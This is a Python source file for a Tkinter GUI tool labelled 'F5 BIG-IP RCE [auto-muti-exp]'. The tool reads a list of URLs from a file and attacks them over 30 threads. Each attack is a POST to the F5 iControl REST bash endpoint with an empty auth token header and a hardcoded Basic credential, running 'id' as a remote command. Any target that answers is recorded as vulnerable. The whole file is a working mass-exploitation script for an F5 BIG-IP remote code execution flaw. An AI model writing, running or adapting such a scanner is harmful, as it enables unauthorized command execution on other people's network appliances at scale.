import requests
import json
import tkinter as tk
from tkinter import scrolledtext
from tkinter import *
from PIL.ImageTk import PhotoImage
from concurrent.futures import ThreadPoolExecutor
from ttkbootstrap.constants import *
def f5_big_ip_exp(url):
    poc = r"""/mgmt/tm/util/bash"""
    url = url + poc
    try:
        newurl = url.split('//')[1].split('/')[0]
        if ":" not in str(newurl):
            pass
        elif "[" in str(newurl):
            pass
        else:
            host = newurl.split(':')[0]
            port = newurl.split(':')[1]
            headers = {
                "Host":f'{host}:{port}',
                "Connection": "close",
                "Cache-Control": "max-age=0",
                "Authorization": "Basic YWRtaW46QVNhc1M=",
                "X-F5-Auth-Token":"",
                "Upgrade-Insecure-Requests": "1",
                "Content-Type": "application/json"
            }
            data = '{"command":"run","utilCmdArgs":"-c id"}'
            res = requests.post(url, headers=headers, data=data, verify=False, timeout=3)
            if "uid" in res.text:
                commandResult = json.loads(res.text)["commandResult"]
                f5_big_ip_text.insert(END,"---------------------------------\n[! ! ! ! ! ! ] Vulnerable url:" + url + ";The return content is:" + str(commandResult) + "---------------------------------\n")
                f5_big_ip_text.see(END)
                with open ("[exists]F5_BIG_IP_RCE_url.txt", 'a') as f:
                    f.write(url + "\n")
            else:
                f5_big_ip_text.insert(END,"[×]URL without vulnerability:" + url + "\n")
                f5_big_ip_text.see(END)
    except Exception as err:
        f5_big_ip_text.insert(END, "[×]The target request failed, and the error content:" + str(err) + "\n")
        f5_big_ip_text.see(END)
def get_f5_big_ip_addr():
    with open("corrected url.txt","r") as f:
        for address in f.readlines():
            address = address.strip()
            yield address
def f5_big_ip_gui():
    f5_big_ip = Toplevel()
    f5_big_ip.geometry("1035x455")
    f5_big_ip.title("F5 BIG-IP RCE [auto-muti-exp]")
    f5_big_ip.resizable(0, 0)
    logo = PhotoImage(file="./logo.ico")
    f5_big_ip.tk.call('wm', 'iconphoto', f5_big_ip._w, logo)
    global f5_big_ip_text
    f5_big_ip_text = scrolledtext.ScrolledText(f5_big_ip,width=123, height=25)
    f5_big_ip_text.grid(row=0, column=0, padx=10, pady=10)
    f5_big_ip_text.see(END)
    addrs = get_f5_big_ip_addr()
    max_thread_num = 30
    executor = ThreadPoolExecutor(max_workers=max_thread_num)
    for addr in addrs:
        future = executor.submit(f5_big_ip_exp, addr)
    f5_big_ip.mainloop()